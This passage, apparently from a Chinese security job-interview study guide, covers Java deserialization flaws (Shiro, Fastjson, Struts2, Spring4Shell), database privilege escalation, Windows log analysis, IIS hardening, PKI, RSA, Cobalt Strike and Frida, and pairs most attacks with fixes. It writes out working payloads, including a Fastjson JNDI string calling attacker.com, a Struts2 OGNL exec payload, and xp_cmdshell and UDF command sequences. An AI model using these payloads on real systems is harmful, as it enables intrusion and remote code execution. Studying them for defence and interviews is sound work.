+<strong>解析</strong>：考察近年重大漏洞与应急响应能力。易错点：以为 2.15.0 修复即可（实际有 45046 绕过）。面试官想听到：能讲清 JNDI Lookup 调用链、知道 2.16/2.17 才彻底修复、明白绕过原理（递归查找）。
+<strong>考察知识点</strong>：JNDI 注入原理（ldap/rmi/dns 外带）、Log4j 2.x 版本漏洞时间线、CVE-2021-44228/45046/45105 三个 CVE 关联、应急缓解（formatMsgNoLookups + 移除 JndiLookup.class）。<strong>→ 详见《面试精华宝典》精讲第 22 题</strong>。</p>
+<h3 id="day-65-shiro-shiro-550721">Day 65 ｜ ★★★★★ Shiro 反序列化漏洞（Shiro-550/721）<a class="headerlink" href="#day-65-shiro-shiro-550721" title="Permanent link">&para;</a></h3>
+<p><strong>题目</strong>：Shiro-550 与 Shiro-721 的区别？
+<strong>答案</strong>：
+- <strong>Shiro-550（CVE-2016-4437）</strong>：
+  - 原理：Shiro <code>rememberMe</code> cookie 使用 AES-CBC 加密，<strong>硬编码密钥</strong> <code>kPH+bIxk5D2deZiIxcaaaA==</code>。
+  - 已知密钥 → 构造恶意序列化数据 → AES-CBC 加密 → 设置 rememberMe cookie → 反序列化触发 gadget（CommonsCollections 等）。
+  - 影响：Shiro &lt; 1.2.5。
+- <strong>Shiro-721（CVE-2019-12422）</strong>：
+  - 原理：Shiro 1.2.5 后改用随机密钥，但 padding oracle 攻击可逐字节猜解。
+  - 发送大量 rememberMe cookie + 比对错误信息 → 反推明文 → 构造恶意序列化 payload。
+  - 影响：Shiro &lt; 1.4.2。
+- <strong>利用工具</strong>：ysoserial 生成 payload、ShiroExploit GUI、shiro_attack。
+- <strong>修复</strong>：
+  - Shiro-550：升级 + 自定义密钥（<code>shiro.rememberMe.key</code>）。
+  - Shiro-721：升级到 1.4.2+。
+  - 关闭 rememberMe 功能（若不需要）。
+<strong>解析</strong>：考察 Java 反序列化经典案例。易错点：混淆 Shiro-550 和 721 的利用条件（前者靠硬编码密钥，后者靠 padding oracle）。面试官想听到：能讲清 AES-CBC 加密细节、padding oracle 原理、ysoserial 生成 payload。
+<strong>考察知识点</strong>：Shiro-550 硬编码 AES 密钥、Shiro-721 padding oracle 攻击、rememberMe cookie 加密流程、ysoserial gadget 链。<strong>→ 详见《面试精华宝典》精讲第 23 题</strong>。</p>
+<h3 id="day-66-fastjson-poc">Day 66 ｜ ★★★★★ Fastjson 反序列化漏洞原理与 POC<a class="headerlink" href="#day-66-fastjson-poc" title="Permanent link">&para;</a></h3>
+<p><strong>题目</strong>：Fastjson 反序列化漏洞原理？常见 POC？
+<strong>答案</strong>：
+- <strong>原理</strong>：Fastjson 的 <code>@type</code> 字段支持自动类型还原，攻击者构造 <code>{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/exp","autoCommit":true}</code> → 反序列化触发 JNDI 查找 → 远程加载恶意类 → RCE。
+- <strong>版本演进</strong>：
+  - <strong>1.2.24 及之前</strong>：无任何限制，可直接 @type 触发。
+  - <strong>1.2.25-1.2.41</strong>：增加黑名单（<code>com.sun.rowset.JdbcRowSetImpl</code> 等）。
+  - <strong>1.2.42-1.2.47</strong>：黑名单 + 关键字检测。
+  - <strong>1.2.48-1.2.68</strong>：开启 <code>safeMode</code> 才安全；否则仍可通过 <code>java.lang.Class</code> 等绕过。
+  - <strong>1.2.83+</strong>：默认禁用 autoType，相对安全。
+- <strong>常见 POC</strong>：
+  - JdbcRowSetImpl + JNDI（最早）。
+  - TemplatesImpl + <code>@type</code> 触发内部类加载。
+  - 各种 gadget（CB/CC/Spring/SLF4J 等）。
+- <strong>利用工具</strong>：FastjsonAttack、fastjson-scan-burp、ysoserial。
+- <strong>修复</strong>：升级 1.2.83+；启用 <code>safeMode</code>；不反序列化不可信数据。
+<strong>解析</strong>：考察 Java 反序列化核心考点。易错点：以为升级就绝对安全（仍有绕过）。面试官想听到：能讲清 autoType 黑名单绕过历史、知道 TemplatesImpl 是最后通杀、明白 fastjson 1.x 与 2.x 差异。
+<strong>考察知识点</strong>：@type 自动类型还原原理、JdbcRowSetImpl JNDI 触发链、版本绕过时间线（1.2.24 → 1.2.83）、TemplatesImpl 内部类加载、safeMode 与 ParserConfig 黑名单。<strong>→ 详见《面试精华宝典》精讲第 24 题</strong>。</p>
+<h3 id="day-67-struts2-rce-ognl">Day 67 ｜ ★★★ Struts2 历史 RCE 漏洞与 OGNL 表达式注入<a class="headerlink" href="#day-67-struts2-rce-ognl" title="Permanent link">&para;</a></h3>
+<p><strong>题目</strong>：Struts2 历史经典 RCE 有哪些？OGNL 是什么？
+<strong>答案</strong>：
+- <strong>OGNL（Object-Graph Navigation Language）</strong>：Struts2 标签属性使用的表达式语言，可访问对象方法（如 <code>Runtime.getRuntime().exec("cmd")</code>）。
+- <strong>经典漏洞</strong>：
+  - <strong>S2-045（CVE-2017-5638）</strong>：Content-Type 头 OGNL 注入（multipart/form-data 解析时）。
+  - <strong>S2-046</strong>：与 S2-045 类似，触发点在 Content-Disposition 的 filename。
+  - <strong>S2-048</strong>：Struts2 插件的 OGNL 注入（freemarker、codebehind）。
+  - <strong>S2-052（CVE-2017-9805）</strong>：REST 插件 XStream 反序列化。
+  - <strong>S2-053</strong>：Freemarker 标签 OGNL 注入。
+  - <strong>S2-057（CVE-2018-11776）</strong>：redirectAction OGNL 注入。
+  - <strong>S2-061（CVE-2020-17530）</strong>：OGNL 沙箱绕过。
+- <strong>POC 示例</strong>：<code>%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(#a)}</code>
+- <strong>修复</strong>：升级到 Struts 2.5.26+ / 6.x；禁用 OGNL（特定场景）；WAF 拦截 <code>ognl</code> 关键字。
+<strong>解析</strong>：考察经典框架漏洞理解。易错点：只说 S2-045。面试官想听到：能列 5+ S2 系列 CVE、明白 OGNL 沙箱绕过思路、知道 Content-Type/filename 等不同注入点。
+<strong>考察知识点</strong>：OGNL 表达式语法、S2-045/046/048/052/053/057/061 时间线、Content-Type/filename/redirectAction 注入点、OGNL 沙箱绕过。<strong>→ 详见《面试精华宝典》精讲第 47 题</strong>。</p>
+<h3 id="day-68-spring4shellcve-2022-22965">Day 68 ｜ ★★★ Spring4Shell（CVE-2022-22965）漏洞原理与利用<a class="headerlink" href="#day-68-spring4shellcve-2022-22965" title="Permanent link">&para;</a></h3>
+<p><strong>题目</strong>：Spring4Shell 漏洞原理？与 Log4Shell 区别？
+<strong>答案</strong>：
+- <strong>原理</strong>：Spring 框架（Spring MVC）的 DataBinder 在处理请求参数时未严格限制属性绑定路径，攻击者构造 <code>class.module.classLoader.DefaultAssertionStatus</code> 等嵌套属性 → 通过 <code>Module</code> 的 <code>ClassLoader</code> 修改 <code>URLStreamHandler</code> 中的 <code>path</code> 字段 → 修改 Tomcat 日志路径并写入 webshell。
+- <strong>触发条件</strong>：
+  - <strong>JDK ≥ 9</strong>（<code>Module</code> API 引入）。
+  - 使用 Spring MVC + Tomcat。
+  - 应用以可写权限运行。
+- <strong>影响版本</strong>：Spring 5.x（部分）、JDK 9-17、Tomcat。
+- <strong>修复</strong>：
+  - Spring 5.3.18+ / 5.2.20+。
+  - 升级 Tomcat（高版本已修复）。
+  - <strong>禁用 WebDataBinder 的特殊字段绑定</strong>（核心修复）。
+- <strong>与 Log4Shell 区别</strong>：
+  - <strong>Log4Shell</strong>：JNDI 远程加载类，原理简单，影响面广。
+  - <strong>Spring4Shell</strong>：JDK Module API + Tomcat 类加载器 + 数据绑定，原理复杂，利用条件苛刻，影响面相对小。
+<strong>解析</strong>：考察近年重大 RCE 漏洞。易错点：与 Log4Shell 混淆。面试官想听到：能讲清 DataBinder 属性绑定漏洞原理、明白需要 JDK 9+ Module API、知道实际利用条件苛刻（不像 Log4Shell 普遍）。
+<strong>考察知识点</strong>：Spring DataBinder 属性绑定漏洞、JDK 9+ Module API 利用、Tomcat Pipeline + classLoader 写入 webshell、影响版本组合（Spring+JDK 9-17+Tomcat）、与 Log4Shell 对比。<strong>→ 详见《面试精华宝典》精讲第 46 题</strong>。</p>
+<hr />
+<h1 id="_12">============================================================<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h1>
+<h1 id="_13">模块十一　操作系统 / 数据库 / 日志深入<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h1>
+<h3 id="day-69-mysql-udf-mof">Day 69 ｜ ★★★★ MySQL UDF / MOF 提权原理<a class="headerlink" href="#day-69-mysql-udf-mof" title="Permanent link">&para;</a></h3>
+<p><strong>题目</strong>：MySQL UDF 提权和 MOF 提权的原理？
+<strong>答案</strong>：
+- <strong>UDF（User Defined Function）提权</strong>：
+  - 原理：MySQL 允许加载用户自定义函数（.so/.dll），<code>create function sys_exec returns integer soname 'udf.dll'</code> 注册后即可调用执行系统命令。
+  - <strong>步骤</strong>：
+    1. 上传 .so/.dll 到 MySQL 插件目录（<code>@@plugin_dir</code>）。
+    2. <code>CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.dll';</code>
+    3. <code>SELECT sys_exec('whoami');</code>
+  - <strong>条件</strong>：MySQL 用户有 FILE 权限 + 知道插件目录 + 目录可写。
+- <strong>MOF（Managed Object Format）提权（仅 Windows）</strong>：
+  - 原理：Windows WMI 服务每 5 秒扫描 <code>c:/windows/system32/wbem/mof/</code> 目录的 .mof 文件并执行其语句。
+  - <strong>步骤</strong>：
+    1. 上传恶意 .mof 文件（含 <code>On Error Resume Next; New ActiveXObject("Wscript.Shell").Run "cmd.exe /c ..."</code>）。
+    2. 5 秒后自动执行。
+  - <strong>条件</strong>：Windows + MySQL &lt; 5.7 + FILE 权限 + 目录可写。
+- <strong>现代 MySQL 缓解</strong>：5.7+ 插件目录默认安全，root 密码策略加强，secure_file_priv 限制。
+- <strong>修复</strong>：升级 MySQL + 限制 FILE 权限 + 改 root 密码 + 限制网络访问。
+<strong>解析</strong>：考察数据库提权核心技术。易错点：把 UDF 当万能（需插件目录可写）。面试官想听到：能讲清 UDF 注册步骤、知道 MOF 仅 Windows 且依赖 WMI、明白现代 MySQL 已限制。
+<strong>考察知识点</strong>：UDF 注册流程（CREATE FUNCTION）、插件目录（@@plugin_dir）确认、MOF 提权 WMI 扫描原理、现代 MySQL 5.7+/8.x 提权难度上升。<strong>→ 详见《面试精华宝典》精讲第 26 题</strong>。</p>
+<h3 id="day-70-mssql">Day 70 ｜ ★★★ MSSQL 数据库提权与命令执行方法<a class="headerlink" href="#day-70-mssql" title="Permanent link">&para;</a></h3>
+<p><strong>题目</strong>：MSSQL 提权与命令执行有哪些方法？
+<strong>答案</strong>：
+- <strong>xp_cmdshell</strong>（最直接）：
+  - <code>EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';</code>
+  - 条件：sa 权限（默认关闭，需 sp_configure 开启）。
+- <strong>sp_OACreate</strong>（COM 组件）：
+  - <code>EXEC sp_OACreate 'wscript.shell', @shell OUT; EXEC sp_OAMethod @shell, 'run', null, 'whoami';</code>
+  - 备选方案：xp_cmdshell 被禁时使用。
+- <strong>CLR Assembly</strong>：
+  - 创建 .NET 程序集，注册到 MSSQL，调用 <code>System.Diagnostics.Process.Start</code>。
+  - 条件：sa + 启用 CLR 集成。
+- <strong>OpenRowSet + DNS 外带</strong>（盲打）：
+  - <code>EXEC OpenRowSet('SQLOLEDB', 'server=xxx;uid=sa;pwd=xxx', 'SELECT 1')</code>。
+- <strong>PowerShell 命令执行</strong>：
+  - 通过 xp_cmdshell 启动 <code>powershell -enc</code> 绕过杀软。
+- <strong>日志写 webshell</strong>：
+  - <code>EXEC xp_dirtree 'c:\inetpub\wwwroot\'</code> 创建目录树 + 日志命令执行。
+- <strong>xp_regread/xp_regwrite</strong>：读写注册表（启动项写入）。
+- <strong>修复</strong>：最小权限 + 关闭 xp_cmdshell + 修改 sa 默认端口 + 强口令 + 关闭远程登录。
+<strong>解析</strong>：考察 MSSQL 数据库实操。易错点：以为所有 sa 都能直接用（默认关闭）。面试官想听到：能讲清 sp_configure 开启流程、知道 sp_OACreate 与 CLR 替代方案、明白 OpenRowSet 用于盲打。
+<strong>考察知识点</strong>：xp_cmdshell 开启流程（sp_configure）、替代方案（sp_OACreate + CLR Assembly）、OpenRowSet 跨库访问、xp_dirtree + 日志写 webshell、注册表读写（启动项）。<strong>→ 详见《面试精华宝典》精讲第 42 题</strong>。</p>
+<h3 id="day-71-windows-id">Day 71 ｜ ★★★★ Windows 日志分析与关键事件 ID<a class="headerlink" href="#day-71-windows-id" title="Permanent link">&para;</a></h3>
+<p><strong>题目</strong>：Windows 安全日志分析关注哪些关键事件 ID？
+<strong>答案</strong>：
+- <strong>登录相关</strong>：
+  - <strong>4624</strong>：成功登录（含 Logon Type 2=交互、3=网络、4=批处理、10=RDP）。
+  - <strong>4625</strong>：登录失败（爆破线索：多个相同账号失败）。
+  - <strong>4634/4647</strong>：注销/关闭。
+  - <strong>4648</strong>：使用显式凭据登录（提权常见）。
+- <strong>进程/服务</strong>：
+  - <strong>4688</strong>：进程创建（含命令行，需开启审计策略）。
+  - <strong>4697</strong>：服务安装（persistence 关键事件）。
+  - <strong>7045</strong>：服务安装（System 日志）。
+- <strong>账户/组</strong>：
+  - <strong>4720</strong>：创建用户。
+  - <strong>4722</strong>：启用用户。
+  - <strong>4724/4723</strong>：重置密码。
+  - <strong>4728/4732/4756</strong>：用户加入特权组（Administrators/Remote Desktop Users）。
+  - <strong>4738</strong>：用户变更。
+- <strong>对象访问</strong>：
+  - <strong>4663</strong>：文件访问。
+  - <strong>5145</strong>：网络共享访问检查。
+- <strong>策略变更</strong>：
+  - <strong>4719</strong>：系统审计策略变更（攻击者清日志时会触发）。
+  - <strong>1102</strong>：审计日志被清除（<strong>红色警报！</strong>）。
+- <strong>日志位置</strong>：
+  - <code>eventvwr.msc</code> → Windows 日志 → Security/System/Application。
+  - 文件位置：<code>C:\Windows\System32\winevt\Logs\Security.evtx</code>。
+- <strong>常用工具</strong>：LogParser、EventLog Explorer、Splunk、ELK、Chainsaw、Hayabusa。
+<strong>解析</strong>：考察应急响应与日志分析核心。易错点：只说 4624/4625。面试官想听到：能列 10+ Event ID 及含义、知道 1102 是清日志红色警报、明白 Logon Type 区分登录方式。
+<strong>考察知识点</strong>：关键 Event ID（4624/4625/4688/4720/4728/4738/1102）、Logon Type 2/3/4/10 区分、进程创建审计（4688 需开启策略）、日志清除 1102 红色警报、分析工具（LogParser/Chainsaw/Hayabusa）。<strong>→ 详见《面试精华宝典》精讲第 31 题</strong>。</p>
+<h3 id="day-72-iis">Day 72 ｜ ★★★ IIS 服务器安全保护措施<a class="headerlink" href="#day-72-iis" title="Permanent link">&para;</a></h3>
+<p><strong>题目</strong>：IIS 服务器常见漏洞与安全加固？
+<strong>答案</strong>：
+- <strong>常见漏洞</strong>：
+  - <strong>IIS 6.0 解析漏洞</strong>：<code>*.asp;*.jpg</code> 按 asp 解析；目录 <code>/*.asp/</code> 下文件当 asp。
+  - <strong>PUT 上传</strong>（CVE-2017-7269）：IIS 6.0 WebDAV 缓冲区溢出。
+  - <strong>短文件名泄露</strong>：<code>http://target.com/a*~1.*/x.aspx</code> 列出短文件名（含敏感文件）。
+  - <strong>IIS 7.0+ 解析漏洞</strong>：<code>shell.jpg/.php</code> 触发 FastCGI 解析。
+  - <strong>目录遍历</strong>：<code>http://target.com/..%5c..%5cwindows/system32/...</code>。
+- <strong>安全加固</strong>：
+  1. <strong>升级到 IIS 10</strong>（Win Server 2016+），不再支持 WebDAV 默认。
+  2. <strong>删除/禁用不需要的扩展</strong>：PHP、ASP.NET 版本对应、CGI 模块按需。
+  3. <strong>关闭 WebDAV</strong>（若不需要）。
+  4. <strong>限制 HTTP 方法</strong>：仅允许 GET/POST/PUT/DELETE/HEAD/OPTIONS 中的必要项。
+  5. <strong>URL 重写</strong>：拦截敏感路径（<code>/admin</code>、<code>/phpmyadmin</code>）。
+  6. <strong>配置 HTTPS</strong>：启用 TLS 1.2/1.3 + HSTS。
+  7. <strong>限制上传目录执行权限</strong>：用 <code>&lt;location path="upload"&gt;</code> 配 <code>scriptProcessor=""</code>。
+  8. <strong>开启日志审计</strong>：W3C 格式 + 集中日志服务器。
+  9. <strong>删除默认站点</strong>：Default Web Site 含示例代码可能泄露。
+  10. <strong>文件权限</strong>：web 目录仅 IIS_IUSRS 读、写入目录单独授权。
+<strong>解析</strong>：考察 Windows Web 服务器加固。易错点：只说关闭 IIS。面试官想听到：能列具体漏洞类型（解析/短文件名/WebDAV）、明白按需开放原则、知道上传目录禁执行。
+<strong>考察知识点</strong>：IIS 6 解析漏洞（;jpg/目录）、短文件名猜解、WebDAV 历史洞（CVE-2017-7269）、加固（升级/删除扩展/限制 HTTP 方法/上传目录禁执行）。<strong>→ 详见《面试精华宝典》精讲第 39 题</strong>。</p>
+<hr />
+<h1 id="_14">============================================================<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h1>
+<h1 id="_15">模块十二　加密深化 · 合规 · 移动 · 软技能<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h1>
+<h3 id="day-73-20">Day 73 ｜ ★★★★ 等级保护 2.0 主要要求与流程<a class="headerlink" href="#day-73-20" title="Permanent link">&para;</a></h3>
+<p><strong>题目</strong>：等保 2.0 测评流程？三级系统的核心要求？
+<strong>答案</strong>：
+- <strong>等保级别</strong>：五级（自主/指导/监督/强制/专控保护），一般系统定级二/三级。
+- <strong>2.0 核心要求</strong>（技术 + 管理两大体系）：
+  - <strong>安全物理环境</strong>：防火/防雷/防静电/温控/监控。
+  - <strong>安全通信网络</strong>：网络架构冗余、带宽保障、关键节点设备保护。
+  - <strong>安全区域边界</strong>：边界防护（防火墙）、访问控制、恶意代码防范、流量监控。
+  - <strong>安全计算环境</strong>：身份鉴别、访问控制、安全审计、入侵防范、数据完整性/保密性。
+  - <strong>安全管理中心</strong>：集中管控、监测预警、安全事件响应。
+- <strong>扩展要求</strong>（云计算/移动互联/物联网/工业控制/大数据）：分别有附加要求。
+- <strong>测评流程</strong>：
+  1. <strong>定级备案</strong>：自主定级 + 公安备案。
+  2. <strong>建设整改</strong>：按级别要求做技术/管理改造。
+  3. <strong>测评</strong>：第三方测评机构出具报告。
+  4. <strong>监督检查</strong>：公安网安监督检查。
+  5. <strong>复测</strong>：每年至少一次（<strong>三级系统</strong>）。
+- <strong>三级关键指标</strong>：
+  - 主机/网络访问控制 + 强制身份认证（密码 + 双因素）。
+  - 安全审计覆盖所有用户行为（<strong>留存 ≥ 6 个月</strong>）。
+  - 入侵防范（IDS/IPS/WAF）。
+  - 集中管控（堡垒机、日志集中、补丁管理）。
+- <strong>二级差异</strong>：审计要求 60 天，相对三级略弱。
+<strong>解析</strong>：考察合规与体系建设。易错点：只说等保 1.0（已废）。面试官想听到：能讲清 2.0 五大扩展方向、知道三级要求严苛（含日志 ≥6 个月 + 集中管控）、明白测评流程 5 步。
+<strong>考察知识点</strong>：五级体系（一般二/三级）、2.0 五大扩展（云/移动/物联网/工控/大数据）、测评流程 5 步、三级要求（审计 6 个月 + 集中管控 + 双因素）。<strong>→ 详见《面试精华宝典》精讲第 25 题</strong>。</p>
+<h3 id="day-74-pki-ca">Day 74 ｜ ★★★ PKI 与 CA 数字证书体系<a class="headerlink" href="#day-74-pki-ca" title="Permanent link">&para;</a></h3>
+<p><strong>题目</strong>：PKI 体系是什么？证书如何签发与验证？
+<strong>答案</strong>：
+- <strong>PKI（Public Key Infrastructure）</strong>：基于公钥密码学的安全体系，提供身份认证、加密、签名、完整性。
+- <strong>核心组件</strong>：
+  - <strong>CA（Certificate Authority）</strong>：证书颁发机构，签发证书（根 CA + 中间 CA）。
+  - <strong>RA（Registration Authority）</strong>：注册机构，审核申请。
+  - <strong>CRL（Certificate Revocation List）</strong>：证书吊销列表。
+  - <strong>OCSP（Online Certificate Status Protocol）</strong>：在线证书状态查询。
+  - <strong>KMS（Key Management System）</strong>：密钥管理。
+- <strong>证书结构</strong>（X.509 v3）：颁发者、主体、公钥、有效期、签名算法、扩展（SAN、Key Usage）。
+- <strong>证书链验证</strong>：
+  1. 客户端收到服务端证书 → 查找颁发者 CA → 用 CA 公钥验证签名 → 递归到根 CA。
+  2. 检查证书有效期、域名（SAN）、用途（Key Usage）。
+  3. 查询 OCSP/CRL 确认未吊销。
+- <strong>应用场景</strong>：HTTPS（TLS 证书）、代码签名（驱动/应用签名）、邮件签名（S/MIME）、VPN 双向认证。
+- <strong>常见攻击</strong>：
+  - <strong>CA 妥协</strong>：DigiNotar（2011）签发了 500+ 假 Google 证书。
+  - <strong>证书伪造</strong>：自签名证书 + 中间人。
+  - <strong>域名劫持</strong>：申请 <code>*.example.com</code> 通配符证书劫持子域。
+  - <strong>Heartbleed/POODLE</strong>：OpenSSL 历史漏洞。
+- <strong>修复</strong>：使用权威 CA（Let's Encrypt / DigiCert）、强制 TLS 1.2+、OCSP Stapling、CAA 记录限制可签发 CA。
+<strong>解析</strong>：考察证书体系与 HTTPS 底层。易错点：只说"CA 颁发证书"。面试官想听到：能讲清证书链验证流程、知道 OCSP/CRL 防吊销、了解 Heartbleed/POODLE 等历史漏洞、明白 CAA 记录防滥用。
+<strong>考察知识点</strong>：PKI 核心组件（CA/RA/CRL/OCSP/KMS）、X.509 证书结构、证书链验证流程、历史 CA 事故（DigiNotar 2011）、CAA 记录与 OCSP Stapling。<strong>→ 详见《面试精华宝典》精讲第 41 题</strong>。</p>
+<h3 id="day-75-rsa">Day 75 ｜ ★★★★ RSA 算法原理与攻击场景<a class="headerlink" href="#day-75-rsa" title="Permanent link">&para;</a></h3>
+<p><strong>题目</strong>：RSA 算法原理？常见攻击场景？
+<strong>答案</strong>：
+- <strong>RSA 数学原理</strong>：
+  - 选两个大素数 p、q，n = p×q，φ(n) = (p-1)(q-1)。
+  - 选 e（公钥指数，常 65537），d 是 e 模 φ(n) 的逆元（私钥）。
+  - 加密：C = M^e mod n；解密：M = C^d mod n。
+  - 安全性基于<strong>大整数分解困难</strong>（n 难分解）。
+- <strong>关键参数</strong>：n ≥ 2048 位（现代标准，4096 更安全）。
+- <strong>常见攻击</strong>：
+  1. <strong>小公钥指数攻击</strong>（e=3）：M^e &lt; n 时直接开 e 次方还原。
+  2. <strong>共模攻击</strong>：同一明文用相同 n 不同 e 加密可恢复。
+  3. <strong>低加密指数广播攻击</strong>（Håstad）：同一明文发 e 个用户，中国剩余定理恢复。
+  4. <strong>Wiener 攻击</strong>：d 较小时（d &lt; n^0.25）连分数分解。
+  5. <strong>Bleichenbacher 攻击</strong>：PKCS#1 v1.5 填充预言（Padding Oracle）。
+  6. <strong>ROBOT 攻击</strong>（CVE-2017-13082）：TLS RSA 加密密钥交换回退漏洞。
+  7. <strong>量子算法（Shor）</strong>：量子计算机可多项式时间分解（威胁未来）。
+- <strong>最佳实践</strong>：
+  - 密钥 ≥ 2048 位，4096 更安全。
+  - 使用 OAEP 填充（替代 PKCS#1 v1.5）。
+  - 密钥分离：签名密钥与加密密钥分开。
+  - 防侧信道：恒定时间实现。
+<strong>解析</strong>：考察算法理解 + 攻击场景。易错点：只说"大数难分解"。面试官想听到：能讲清 Wiener/Bleichenbacher/ROBOT 等具体攻击、知道 OAEP 替代 PKCS#1 v1.5、了解量子威胁。
+<strong>考察知识点</strong>：RSA 数学原理（p/q/n/φ/e/d）、攻击（小公钥/共模/Wiener/Bleichenbacher/ROBOT）、填充（PKCS#1 v1.5 vs OAEP）、量子威胁（Shor 算法）。<strong>→ 详见《面试精华宝典》精讲第 34 题</strong>。</p>
+<h3 id="day-76-cobalt-strike-cs">Day 76 ｜ ★★★ Cobalt Strike 使用与 CS 反制方法<a class="headerlink" href="#day-76-cobalt-strike-cs" title="Permanent link">&para;</a></h3>
+<p><strong>题目</strong>：Cobalt Strike（CS）是什么？红队怎么用？蓝队如何反制？
+<strong>答案</strong>：
+- <strong>Cobalt Strike（CS）</strong>：商业红队 C2（Command &amp; Control）框架，包含 team server、client GUI、beacon payload、Aggressor 脚本。
+- <strong>核心组件</strong>：
+  - <strong>Listener</strong>：监听 beacon 上线（HTTP/HTTPS/DNS/SMB）。
+  - <strong>Beacon</strong>：植入目标主机的 payload（C/C#/Python/Java）。
+  - <strong>Aggressor Script</strong>：Sleep 脚本（自动化 + UI 定制）。
+- <strong>红队使用流程</strong>：
+  1. 启动 team server：<code>./teamserver IP password</code>。
+  2. client 连接，建 Listener（HTTP 80 / HTTPS 443）。
+  3. 生成 payload：Attacks → Packages → Windows Executable。
+  4. 投递执行（钓鱼/捆绑/植入），beacon 上线。
+  5. 后渗透：进程迁移、提权、横向、文件操作、端口转发、SOCKS 代理。
+- <strong>隐蔽技术</strong>：
+  - <strong>Malleable C2 Profile</strong>：自定义 HTTP/HTTPS 流量画像（伪装合法域名）。
+  - <strong>Sleep + jitter</strong>：心跳随机化躲流量检测。
+  - <strong>进程注入</strong>：beacon 注入合法进程（svchost/explorer）。
+  - <strong>域前置</strong>（Domain Fronting）：CDN 加速 + 真实 C2 隐藏。
+  - <strong>DNS Beacon</strong>：隧道走 DNS 53 端口。
+- <strong>蓝队反制</strong>：
+  1. <strong>流量特征</strong>：默认 90s 心跳 + UA 含 <code>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)</code>（已被广泛识别，建议改 Malleable Profile）。
+  2. <strong>样本分析</strong>：内存 dump 找 CS 特征字符串（<code>%c%c%c</code>、<code>%s as %s\\\\%s</code>、<code>cobaltstrike</code>）。
+  3. <strong>证书指纹</strong>：CS HTTPS 默认证书可被 IDS 比对。
+  4. <strong>DNS 隧道检测</strong>：监控大量异常 TXT/AAAA 查询。
+  5. <strong>EDR 检测</strong>：beacon 注入进程、横向命令（psexec/wmic）行为告警。
+  6. <strong>日志关联</strong>：CS 默认写 cna 脚本到 AppData，可取证。
+- <strong>替代品</strong>：Sliver（开源）、Havoc、Mythic。
+<strong>解析</strong>：考察现代红蓝对抗核心。易错点：只说"C2 工具"。面试官想听到：能讲清 Malleable Profile 流量定制、知道默认特征已被识别、明白 Sliver/Havoc 等开源替代。
+<strong>考察知识点</strong>：CS 三大组件（Listener/Beacon/Aggressor）、Malleable C2 流量画像定制、隐蔽技术（Sleep+jitter/进程注入/DNS Beacon）、蓝队反制（流量特征+内存取证+EDR 行为告警）、开源替代（Sliver/Havoc/Mythic）。<strong>→ 详见《面试精华宝典》精讲第 50 题</strong>。</p>
+<h3 id="day-77-frida-hook">Day 77 ｜ ★★★★ Frida 移动端 Hook 框架原理与使用<a class="headerlink" href="#day-77-frida-hook" title="Permanent link">&para;</a></h3>
+<p><strong>题目</strong>：Frida 是什么？移动端安全测试如何使用？
+<strong>答案</strong>：
+- <strong>Frida</strong>：动态插桩工具，通过向运行中的进程注入 JavaScript/V8 引擎，Hook 函数调用、修改返回值、调用栈跟踪。
+- <strong>架构</strong>：
+  - <strong>Frida Server</strong>：注入到目标设备（Android/iOS），与 Frida Client 通信。
+  - <strong>Frida Client</strong>：Python/Node.js 绑定，本地编写脚本。
+  - <strong>Gadget</strong>：静态注入版本（用于脱壳/分析）。
+- <strong>核心功能</strong>：
+  - <strong>Hook 函数</strong>：<code>Java.perform(function() { var cls = Java.use('com.app.target'); cls.method.implementation = function() { return 'modified'; }; });</code>
+  - <strong>调用栈</strong>：<code>Java.use('android.util.Log').d.implementation = function() { console.log(Java.use('android.util.Log').getStackTraceString(...)); };</code>
+  - <strong>绕过 SSL Pinning</strong>：Hook <code>TrustManagerFactory</code> / <code>X509TrustManager</code>。
+  - <strong>脱壳</strong>：Hook <code>DexFile.loadDex</code>、Hook 各种加固厂商的解密函数。
+  - <strong>Hook Native</strong>：用 <code>Interceptor.attach(Module.findExportByName('libc.so', 'open'), ...)</code>。
+- <strong>使用流程（Android）</strong>：
+  1. <code>adb push frida-server /data/local/tmp/</code>
+  2. <code>adb shell chmod 755 /data/local/tmp/frida-server</code>
+  3. <code>adb shell su -c /data/local/tmp/frida-server &amp;</code>
+  4. <code>frida -U -f com.target.app -l hook.js --no-pause</code>。
+- <strong>常见场景</strong>：SSL Pinning 绕过、加密算法 Hook（看明文）、协议分析（Hook 网络请求）、脱壳（Hook 各类加固）、Root/越狱检测绕过。
+- <strong>检测对抗</strong>：检测 frida-server 端口（27042 默认）、检测 <code>/proc/self/maps</code> 中的 frida-agent、检测 frida-gadget 的特征字符串、双进程保护。
+<strong>解析</strong>：考察移动安全核心工具。易错点：只说"Hook 工具"。面试官想听到：能写简单 JS Hook 代码、知道 SSL Pinning 绕过原理、了解 frida 检测对抗方法、明白 Frida 在脱壳中的角色。
+<strong>考察知识点</strong>：Frida 架构（Server/Client/Gadget）、Java.use + implementation 注入、Interceptor.attach Hook Native、SSL Pinning 绕过思路、frida-server 端口 27042 + 检测对抗。<strong>→ 详见《面试精华宝典》精讲第 37 题</strong>。</p>
+<h3 id="day-78-android-apk">Day 78 ｜ ★★★ Android APK 反编译与加固对抗方法<a class="headerlink" href="#day-78-android-apk" title="Permanent link">&para;</a></h3>
+<p><strong>题目</strong>：Android APK 如何反编译？常见加固方案如何对抗？
+<strong>答案</strong>：
+- <strong>APK 反编译工具</strong>：
+  - <strong>apktool</strong>：反编译资源（AndroidManifest.xml、布局 XML）。
+  - <strong>jadx</strong>：反编译 Java 源码（DEX → Java）。
+  - <strong>JEB</strong>：商业反编译（更强，处理混淆）。
+  - <strong>GDA</strong>：国产反编译工具。
